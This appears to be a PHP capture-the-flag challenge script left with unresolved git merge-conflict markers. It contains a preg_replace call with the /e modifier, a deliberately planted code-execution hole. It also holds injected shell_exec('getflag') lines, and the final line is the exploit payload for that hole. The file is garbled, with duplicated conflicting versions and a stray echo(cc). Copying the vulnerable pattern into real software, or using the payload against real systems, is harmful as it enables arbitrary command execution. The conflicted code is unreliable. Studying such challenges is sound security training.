#!/usr/bin/php
<?php
<<<<<<< HEAD
function y($m) { 
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; 
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    y(" ${shell_exec('getflag')}    ");
    return $a; 
}

echo(cc);

=======
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
	return $a;
}
>>>>>>> 365a9552c46a7d06cd069021f4527403578272b3
$r = x($argv[1], $argv[2]); print $r;
?>

[x ${shell_exec('getflag')}]